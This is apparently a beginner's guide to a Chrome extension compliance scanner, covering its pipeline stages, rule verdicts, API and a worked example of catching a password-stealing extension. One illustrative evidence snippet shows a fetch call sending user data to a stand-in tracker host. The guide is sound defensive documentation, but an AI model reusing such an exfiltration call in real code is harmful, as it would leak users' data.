# Compliance Scanner - Beginner's Guide

<p align="center">
  <strong>Understanding the Compliance Pipeline Step-by-Step</strong>
</p>

---

## What is the Compliance Scanner?

Think of the Compliance Scanner as a **security auditor** that checks Chrome extensions against official policies (like Chrome Web Store rules or India's data protection law).

**Input**: A Chrome extension (URL, .crx, or .zip file)  
**Output**: A verdict saying PASS ✅, FAIL ❌, or NEEDS_REVIEW ⚠️ for each rule

---

## The Big Picture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     COMPLIANCE SCANNER                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   YOU (User)                                                        │
│     │                                                               │
│     │  Submit extension URL or file                                 │
│     ▼                                                               │
│   ┌─────────────────┐                                               │
│   │    Stage 0-1    │  ← Security scan (existing Project Atlas)     │
│   │  Download &     │                                               │
│   │  Analyze        │                                               │
│   └────────┬────────┘                                               │
│            │                                                        │
│            ▼                                                        │
│   ┌─────────────────┐                                               │
│   │    Stage 2-4    │  ← Convert findings to facts & signals        │
│   │  Build Facts    │                                               │
│   │  & Signals      │                                               │
│   └────────┬────────┘                                               │
│            │                                                        │
│            ▼                                                        │
│   ┌─────────────────┐                                               │
│   │    Stage 5-6    │  ← Check what extension claims to do          │
│   │  Check Claims   │                                               │
│   │  & Context      │                                               │
│   └────────┬────────┘                                               │
│            │                                                        │
│            ▼                                                        │
│   ┌─────────────────┐                                               │
│   │    Stage 7-8    │  ← Apply rules, generate verdicts             │
│   │  Rules Engine   │                                               │
│   │  & Report       │                                               │
│   └────────┬────────┘                                               │
│            │                                                        │
│            ▼                                                        │
│   COMPLIANCE REPORT                                                 │
│   • PASS ✅  (8 rules)                                              │
│   • FAIL ❌  (2 rules)                                              │
│   • NEEDS_REVIEW ⚠️  (5 rules)                                      │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Two Pipelines Explained

The system has **two separate pipelines**:

```
┌─────────────────────────────────────────────────────────────────────┐
│  PIPELINE A: Policy Authoring (Done ONCE, by humans)                │
│  ─────────────────────────────────────────────────────────────────  │
│                                                                     │
│    📝 Human writes rules (YAML files)                               │
│         │                                                           │
│         ▼                                                           │
│    ┌─────────────────────────────────────────────────────────┐     │
│    │  citations.yaml        │  CWS_LIMITED_USE.yaml          │     │
│    │  (policy quotes)       │  DPDP_RISK_INDICATORS.yaml     │     │
│    │                        │  (rule definitions)            │     │
│    └─────────────────────────────────────────────────────────┘     │
│                                                                     │
│    These files are created MANUALLY and rarely change.              │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│  PIPELINE B: Extension Scanning (Done for EACH extension)           │
│  ─────────────────────────────────────────────────────────────────  │
│                                                                     │
│    Extension URL/File                                               │
│         │                                                           │
│         ▼                                                           │
│    ┌──────────────────────┐                                        │
│    │  Stage 0: Download   │  Extract the extension                  │
│    └──────────┬───────────┘                                        │
│               ▼                                                     │
│    ┌──────────────────────┐                                        │
│    │  Stage 1: Scan       │  Run security analyzers                 │
│    └──────────┬───────────┘                                        │
│               ▼                                                     │
│    ┌──────────────────────┐                                        │
│    │  Stage 2-8: Process  │  Build facts → Apply rules              │
│    └──────────┬───────────┘                                        │
│               ▼                                                     │
│    📊 Compliance Report                                             │
│                                                                     │
│    This runs automatically for every extension you scan.            │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Stage-by-Stage Breakdown

### Stage 0: Ingest & Extract

**What it does**: Downloads the extension and unpacks it

```
INPUT:  Chrome Web Store URL or .crx/.zip file
        ↓
        ┌─────────────────────────────┐
        │  • Generate scan_id (UUID)  │
        │  • Calculate file hash      │
        │  • Extract all files        │
        │  • List all files           │
        └─────────────────────────────┘
        ↓
OUTPUT: file_inventory.json
        (list of all files in the extension)
```

**Example Output** (`file_inventory.json`):
```json
{
  "scan_id": "abc123-...",
  "files": [
    "manifest.json",
    "background.js",
    "content.js",
    "popup.html"
  ]
}
```

---

### Stage 1: Security Scan (Existing Project Atlas)

**What it does**: Runs all the security analyzers

```
INPUT:  Extracted extension files
        ↓
        ┌─────────────────────────────────────────┐
        │  Run 5 Analyzers:                       │
        │  ┌────────────────┐ ┌────────────────┐  │
        │  │ Permissions    │ │ SAST (Semgrep) │  │
        │  └────────────────┘ └────────────────┘  │
        │  ┌────────────────┐ ┌────────────────┐  │
        │  │ VirusTotal     │ │ Entropy        │  │
        │  └────────────────┘ └────────────────┘  │
        │  ┌────────────────┐                     │
        │  │ WebStore Info  │                     │
        │  └────────────────┘                     │
        └─────────────────────────────────────────┘
        ↓
OUTPUT: security_findings.json
        (all security issues found)
```

**What each analyzer checks**:
| Analyzer | What It Finds |
|----------|---------------|
| **Permissions** | Dangerous permissions like "access all websites" |
| **SAST** | Suspicious code patterns (eval, password grabbing) |
| **VirusTotal** | Known malware signatures |
| **Entropy** | Obfuscated/hidden code |
| **WebStore** | User ratings, developer trust |

---

### Stage 2: Facts Builder

**What it does**: Converts raw security data into a clean, standardized format

```
INPUT:  security_findings.json (messy, varies by analyzer)
        ↓
        ┌─────────────────────────────────────────┐
        │  Normalize everything into ONE format:  │
        │  • Extension info (name, version, ID)   │
        │  • Manifest contents                    │
        │  • List of all files with hashes        │
        │  • Security findings (cleaned up)       │
        │  • Network endpoints found              │
        └─────────────────────────────────────────┘
        ↓
OUTPUT: facts.json
        (single source of truth)
```

**Think of it like**: Converting different currencies (USD, EUR, INR) into one standard format.

---

### Stage 3: Evidence Index Builder

**What it does**: Creates a searchable index of all evidence with unique IDs

```
INPUT:  facts.json
        ↓
        ┌─────────────────────────────────────────┐
        │  For each finding, create evidence:     │
        │  • Unique ID (ev_001, ev_002, ...)      │
        │  • File path + line numbers             │
        │  • Code snippet (the actual code)       │
        │  • Hash for verification                │
        │  • Timestamp (when collected)           │
        └─────────────────────────────────────────┘
        ↓
OUTPUT: evidence_index.json
        (all evidence with IDs)
```

**Why this matters**: When we say "this extension is bad", we need PROOF. Each piece of evidence has an ID we can reference.

**Example**:
```
┌─────────────────────────────────────────────────────────────┐
│  Evidence ID: ev_001                                        │
│  ─────────────────────────────────────────────────────────  │
│  File: background.js, Lines 45-48                           │
│  Code: fetch('https://evil-tracker.com', {body: userData})  │
│  Type: code                                                 │
│  Hash: sha256:abc123...                                     │
└─────────────────────────────────────────────────────────────┘
```

---

### Stage 4: Signal Extraction

**What it does**: Converts evidence into typed "signals" with confidence scores

```
INPUT:  facts.json + evidence_index.json
        ↓
        ┌─────────────────────────────────────────┐
        │  Extract 4 types of signals:            │
        │                                         │
        │  🔴 HOST_PERMS_BROAD                    │
        │     "Can access ALL websites"           │
        │                                         │
        │  🟠 SENSITIVE_API                       │
        │     "Uses risky functions (eval, etc)"  │
        │                                         │
        │  🟡 ENDPOINT_FOUND                      │
        │     "Sends data to these URLs"          │
        │                                         │
        │  🔵 DATAFLOW_TRACE                      │
        │     "Data flows from A → B → Internet"  │
        └─────────────────────────────────────────┘
        ↓
OUTPUT: signals.json
        (typed signals with confidence 0.0-1.0)
```

**Confidence Levels**:
| Score | Meaning | Example |
|-------|---------|---------|
| **0.95** | Almost certain | Confirmed data exfiltration |
| **0.80** | High confidence | Suspicious API + endpoint |
| **0.60** | Medium confidence | Risky but no proof |
| **0.30** | Low confidence | Might be false positive |

---

### Stage 5: Disclosure Extractor (Optional)

**What it does**: Checks what the extension CLAIMS to do (from Web Store listing)

```
INPUT:  Web Store listing / privacy policy
        ↓
        ┌─────────────────────────────────────────┐
        │  Extract claims:                        │
        │  • What data they say they collect      │
        │  • Why they say they need it            │
        │  • Who they share with                  │
        │  • How long they keep it                │
        └─────────────────────────────────────────┘
        ↓
OUTPUT: disclosure_claims.json
        (what extension claims to do)
```

**Why this matters**: If an extension SAYS "we don't collect data" but our signals show "sends data to tracker.com", that's a **mismatch** = potential violation!

---

### Stage 6: Context Builder

**What it does**: Determines which rules apply to this extension

```
INPUT:  All previous data
        ↓
        ┌─────────────────────────────────────────┐
        │  Determine context:                     │
        │  • Which regions apply? (US, India, EU) │
        │  • Which rulepacks to use?              │
        │    - CWS_LIMITED_USE (Chrome rules)     │
        │    - DPDP_RISK_INDICATORS (India law)   │
        │  • What category is this extension?     │
        └─────────────────────────────────────────┘
        ↓
OUTPUT: context.json
        (which rules to apply)
```

---

### Stage 7: Rules Engine ⚡

**What it does**: Applies rules and produces PASS/FAIL/NEEDS_REVIEW verdicts

```
INPUT:  facts + signals + disclosure + context + rulepacks
        ↓
        ┌─────────────────────────────────────────────────────┐
        │  For each rule in rulepack:                         │
        │                                                     │
        │  Rule: "Excessive Host Permissions"                 │
        │  Condition: host_permissions contains "<all_urls>"  │
        │                    ↓                                │
        │              [ EVALUATE ]                           │
        │                    ↓                                │
        │            Does it match? ─── YES ─→ NEEDS_REVIEW   │
        │                    │                                │
        │                   NO                                │
        │                    ↓                                │
        │                  PASS                               │
        └─────────────────────────────────────────────────────┘
        ↓
OUTPUT: rule_results.json
        (verdict for each rule)
```

**Verdicts Explained**:
```
┌─────────────────────────────────────────────────────────────┐
│  PASS ✅                                                    │
│  "Extension follows this rule"                              │
│  Example: Requests only necessary permissions               │
├─────────────────────────────────────────────────────────────┤
│  FAIL ❌                                                    │
│  "Extension clearly violates this rule"                     │
│  Example: Collects data but claims it doesn't               │
├─────────────────────────────────────────────────────────────┤
│  NEEDS_REVIEW ⚠️                                            │
│  "Suspicious, but needs human to decide"                    │
│  Example: Has broad permissions but might be justified      │
└─────────────────────────────────────────────────────────────┘
```

---

### Stage 8: Report Generator

**What it does**: Creates the final report in multiple formats

```
INPUT:  All previous outputs
        ↓
        ┌─────────────────────────────────────────┐
        │  Generate:                              │
        │  📄 report.json  (full data)            │
        │  🌐 report.html  (pretty web page)      │
        │  📦 bundle.zip   (everything for export)│
        └─────────────────────────────────────────┘
        ↓
OUTPUT: Compliance report ready to view!
```

---

## Complete Data Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│   Extension URL                                                     │
│        │                                                            │
│        ▼                                                            │
│   ┌─────────┐    ┌─────────────────────────────────────────────┐   │
│   │ Stage 0 │───▶│ file_inventory.json                         │   │
│   │ Ingest  │    │ (list of files)                             │   │
│   └────┬────┘    └─────────────────────────────────────────────┘   │
│        │                                                            │
│        ▼                                                            │
│   ┌─────────┐    ┌─────────────────────────────────────────────┐   │
│   │ Stage 1 │───▶│ security_findings.json                      │   │
│   │ Scan    │    │ (SAST, permissions, VT, entropy, webstore)  │   │
│   └────┬────┘    └─────────────────────────────────────────────┘   │
│        │                                                            │
│        ▼                                                            │
│   ┌─────────┐    ┌─────────────────────────────────────────────┐   │
│   │ Stage 2 │───▶│ facts.json                                  │   │
│   │ Facts   │    │ (normalized, clean data)                    │   │
│   └────┬────┘    └─────────────────────────────────────────────┘   │
│        │                                                            │
│        ▼                                                            │
│   ┌─────────┐    ┌─────────────────────────────────────────────┐   │
│   │ Stage 3 │───▶│ evidence_index.json                         │   │
│   │Evidence │    │ (ev_001, ev_002... with code snippets)      │   │
│   └────┬────┘    └─────────────────────────────────────────────┘   │
│        │                                                            │
│        ▼                                                            │
│   ┌─────────┐    ┌─────────────────────────────────────────────┐   │
│   │ Stage 4 │───▶│ signals.json                                │   │
│   │ Signals │    │ (HOST_PERMS_BROAD, SENSITIVE_API, etc.)     │   │
│   └────┬────┘    └─────────────────────────────────────────────┘   │
│        │                                                            │
│        ▼                                                            │
│   ┌─────────┐    ┌─────────────────────────────────────────────┐   │
│   │ Stage 5 │───▶│ disclosure_claims.json                      │   │
│   │Disclosure│   │ (what extension claims it does)             │   │
│   └────┬────┘    └─────────────────────────────────────────────┘   │
│        │                                                            │
│        ▼                                                            │
│   ┌─────────┐    ┌─────────────────────────────────────────────┐   │
│   │ Stage 6 │───▶│ context.json                                │   │
│   │ Context │    │ (which rulepacks apply)                     │   │
│   └────┬────┘    └─────────────────────────────────────────────┘   │
│        │                                                            │
│        │         ┌─────────────────────────────────────────────┐   │
│        │         │ Rulepacks (loaded from YAML files)          │   │
│        │         │ • CWS_LIMITED_USE.yaml                      │   │
│        │         │ • DPDP_RISK_INDICATORS.yaml                 │   │
│        │         └────────────────┬────────────────────────────┘   │
│        │                          │                                 │
│        ▼                          ▼                                 │
│   ┌─────────────────────────────────────┐                          │
│   │            Stage 7                   │                          │
│   │         Rules Engine                 │                          │
│   │   (evaluate each rule condition)     │                          │
│   └─────────────────┬───────────────────┘                          │
│                     │                                               │
│                     ▼                                               │
│   ┌─────────────────────────────────────────────────────────────┐  │
│   │ rule_results.json                                           │  │
│   │ ┌─────────────────────────────────────────────────────────┐ │  │
│   │ │ Rule: CWS_LIMITED_USE::R1         Verdict: NEEDS_REVIEW │ │  │
│   │ │ Rule: CWS_LIMITED_USE::R2         Verdict: FAIL         │ │  │
│   │ │ Rule: DPDP_RISK::R1               Verdict: PASS         │ │  │
│   │ └─────────────────────────────────────────────────────────┘ │  │
│   └─────────────────────────────────────────────────────────────┘  │
│                     │                                               │
│                     ▼                                               │
│   ┌─────────┐    ┌─────────────────────────────────────────────┐   │
│   │ Stage 8 │───▶│ report.json + report.html                   │   │
│   │ Report  │    │ (final compliance report)                   │   │
│   └─────────┘    └─────────────────────────────────────────────┘   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## API Endpoints (How to Use It)

```
┌─────────────────────────────────────────────────────────────────────┐
│                         API ENDPOINTS                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. START A SCAN                                                    │
│     ─────────────────────────────────────────────────────────────   │
│     POST /api/scan/trigger                                          │
│     Body: { "url": "https://chromewebstore.google.com/..." }        │
│                      │                                              │
│                      ▼                                              │
│     Returns: { "scan_id": "abc-123-..." }                           │
│                                                                     │
│  2. CHECK STATUS                                                    │
│     ─────────────────────────────────────────────────────────────   │
│     GET /api/scan/status/{scan_id}                                  │
│                      │                                              │
│                      ▼                                              │
│     Returns: { "status": "running" | "completed" | "failed" }       │
│                                                                     │
│  3. GET RESULTS                                                     │
│     ─────────────────────────────────────────────────────────────   │
│     GET /api/scan/results/{scan_id}                                 │
│                      │                                              │
│                      ▼                                              │
│     Returns: Full compliance report (JSON)                          │
│                                                                     │
│  4. GET HTML REPORT                                                 │
│     ─────────────────────────────────────────────────────────────   │
│     GET /api/scan/report/{scan_id}                                  │
│                      │                                              │
│                      ▼                                              │
│     Returns: Beautiful HTML report                                  │
│                                                                     │
│  5. EXPORT BUNDLE (NEW)                                             │
│     ─────────────────────────────────────────────────────────────   │
│     GET /api/scan/enforcement_bundle/{scan_id}                      │
│                      │                                              │
│                      ▼                                              │
│     Returns: ZIP file with all evidence                             │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## File Structure (Where Everything Lives)

```
/scans/{scan_id}/                    ← One folder per scan
│
├── file_inventory.json              ← Stage 0 output
├── security_findings.json           ← Stage 1 output
├── facts.json                       ← Stage 2 output
├── evidence_index.json              ← Stage 3 output
├── signals.json                     ← Stage 4 output
├── disclosure_claims.json           ← Stage 5 output (or {} if skipped)
├── context.json                     ← Stage 6 output
├── rule_results.json                ← Stage 7 output
├── report.json                      ← Stage 8 output (full report)
└── report.html                      ← Stage 8 output (HTML version)
```

---

## Example: Detecting a Bad Extension

Let's walk through a **real example** of detecting a malicious extension:

```
┌─────────────────────────────────────────────────────────────────────┐
│  EXAMPLE: "Super Fast VPN" Extension                                │
│  (Actually steals your passwords!)                                  │
└─────────────────────────────────────────────────────────────────────┘

Stage 0: Download & Extract
├─ manifest.json
├─ background.js
└─ content.js

Stage 1: Security Scan
├─ Permissions: "<all_urls>" (can access ALL websites) 🔴
├─ SAST: Found password field listener in content.js 🔴
└─ Entropy: background.js has obfuscated code 🟠

Stage 2: Facts Builder
└─ Normalized all findings into clean format

Stage 3: Evidence Index
├─ ev_001: manifest.json line 8 → "<all_urls>"
├─ ev_002: content.js lines 45-52 → password grabbing code
└─ ev_003: background.js → fetch to suspicious URL

Stage 4: Signals
├─ HOST_PERMS_BROAD (confidence: 0.80) → evidence: ev_001
├─ SENSITIVE_API (confidence: 0.80) → evidence: ev_002
├─ ENDPOINT_FOUND (confidence: 0.70) → evidence: ev_003
└─ DATAFLOW_TRACE (confidence: 0.95) → evidence: ev_002, ev_003
   (password → fetch → suspicious-server.com)

Stage 5: Disclosure
└─ Web Store claims: "We don't collect personal data" 🤔

Stage 6: Context
└─ Apply rules: CWS_LIMITED_USE + DPDP_RISK_INDICATORS

Stage 7: Rules Engine
┌────────────────────────────────────────────────────────────────────┐
│ Rule: CWS_LIMITED_USE::R1 "Excessive Host Permissions"             │
│ Condition: host_permissions contains "<all_urls>"                  │
│ Result: ✓ Matches                                                  │
│ Verdict: NEEDS_REVIEW ⚠️                                           │
├────────────────────────────────────────────────────────────────────┤
│ Rule: CWS_LIMITED_USE::R2 "Undisclosed Data Collection"            │
│ Condition: SENSITIVE_API + ENDPOINT_FOUND + no disclosure          │
│ Result: ✓ Matches (collects passwords but claims it doesn't!)      │
│ Verdict: FAIL ❌                                                   │
├────────────────────────────────────────────────────────────────────┤
│ Rule: DPDP_RISK::R1 "Cross-Border Data Transfer"                   │
│ Condition: endpoint to non-India server + India data               │
│ Result: ✓ Matches                                                  │
│ Verdict: NEEDS_REVIEW ⚠️                                           │
└────────────────────────────────────────────────────────────────────┘

Stage 8: Report
┌────────────────────────────────────────────────────────────────────┐
│  COMPLIANCE REPORT: Super Fast VPN                                 │
│  ────────────────────────────────────────────────────────────────  │
│  Total Rules: 15                                                   │
│  ✅ PASS: 10                                                       │
│  ❌ FAIL: 2                                                        │
│  ⚠️  NEEDS_REVIEW: 3                                               │
│                                                                    │
│  ❌ CRITICAL FAILURES:                                             │
│  • Undisclosed Data Collection (CWS_LIMITED_USE::R2)               │
│    Evidence: ev_002, ev_003                                        │
│    Citation: Chrome Web Store Policy Section 5                     │
└────────────────────────────────────────────────────────────────────┘
```

---

## Glossary

| Term | Meaning |
|------|---------|
| **Rulepack** | A collection of rules for a specific policy (e.g., CWS, DPDP) |
| **Signal** | A typed finding with confidence score (e.g., HOST_PERMS_BROAD) |
| **Evidence** | Proof with file path, line numbers, and code snippet |
| **Citation** | Reference to official policy text |
| **Verdict** | PASS, FAIL, or NEEDS_REVIEW |
| **Facts** | Normalized data about the extension |
| **Disclosure** | What the extension claims it does |
| **Mismatch** | When observed behavior doesn't match claims |

---

## Quick Start Checklist

If you want to implement this:

1. ☐ **Lock schemas** (`schemas.py`) - define all data structures
2. ☐ **Create citations.yaml** - quote official policies (10-20 entries)
3. ☐ **Create rulepacks** - CWS + DPDP YAML files (15 rules total)
4. ☐ **Build Stage 2-4** - Facts → Evidence → Signals
5. ☐ **Build Stage 7** - Rules Engine with condition DSL
6. ☐ **Build Stage 8** - Report generator (JSON + HTML)
7. ☐ **Add export endpoint** - `/api/scan/enforcement_bundle/{id}`
8. ☐ **Test end-to-end** - Scan a real extension

---

<p align="center">
  <sub>Now you understand how the Compliance Scanner works! 🎉</sub>
</p>

